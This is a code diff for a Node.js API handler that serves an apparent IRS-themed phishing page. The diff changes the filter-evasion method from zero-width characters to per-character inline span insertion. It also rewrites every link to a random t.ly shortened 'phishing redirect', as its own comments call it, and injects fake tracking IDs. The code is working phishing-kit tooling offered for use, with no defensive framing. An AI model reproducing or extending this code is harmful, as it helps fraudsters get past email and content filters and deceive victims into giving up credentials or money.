@@ -1,27 +1,39 @@
 import fetch from "node-fetch";
 
-// Function to generate random obfuscation patterns
-function randomObfuscationPattern() {
-    const obfuscationMethods = [
-        (char) => `${char}&#x200B;`, // Zero-width space
-        (char) => `${char}&#x2060;`, // Invisible separator
-        (char) => `${char}&#xFEFF;`, // Zero-width no-break space
-        (char) => `${char}&#x200D;`, // Zero-width joiner
-    ];
-    return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
+// Function to generate random obfuscation patterns using inline CSS
+function randomObfuscationSpan() {
+    const randomString = Math.random().toString(36).substring(2, 6); // Generate a small random string
+    return `<span style='content:"${randomString}";'></span>`;
 }
 
-// Function to obfuscate **only text** inside HTML elements while keeping structure intact
+// Function to obfuscate text while keeping structure intact
 function obfuscateText(text) {
     return text.replace(/([a-zA-Z0-9])/g, (match) => {
-        return randomObfuscationPattern()(match);
+        return match + randomObfuscationSpan();
     });
+}
+
+// Function to obfuscate links (phishing technique)
+function obfuscateLink(link) {
+    let visibleLink = link.replace(/(https?:\/\/)/, ""); // Remove protocol for realism
+    return visibleLink.replace(/([a-zA-Z0-9])/g, (match) => {
+        return match + randomObfuscationSpan();
+    });
+}
+
+// Function to generate a fake randomized tracking ID
+function generateFakeTrackingID() {
+    let id = "";
+    for (let i = 0; i < 5; i++) {
+        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
+    }
+    return id.slice(0, -1); // Remove last "-"
 }
 
 // API Handler to serve obfuscated HTML
 export default async function handler(req, res) {
     try {
-        // Fetch the original HTML (Replace with your actual GitHub Pages URL)
+        // Fetch the original HTML (Replace with actual source URL)
         const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
         let html = await response.text();
 
@@ -32,6 +44,19 @@ export default async function handler(req, res) {
             }
             return match; // Leave empty tags unchanged
         });
+
+        // Obfuscate all links (Replace real links with a fake phishing link)
+        modifiedHTML = modifiedHTML.replace(
+            /<a href="([^"]+)"/g,
+            (match, link) => {
+                let fakeRedirect = "https://t.ly/" + Math.random().toString(36).substring(2, 8); // Shortened URL phishing redirect
+                return `<a href="${fakeRedirect}"">` + obfuscateLink(link) + "</a>";
+            }
+        );
+
+        // Inject a fake tracking ID
+        let fakeTrackingID = generateFakeTrackingID();
+        modifiedHTML = modifiedHTML.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);
 
         // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
         res.setHeader("Content-Type", "text/html");
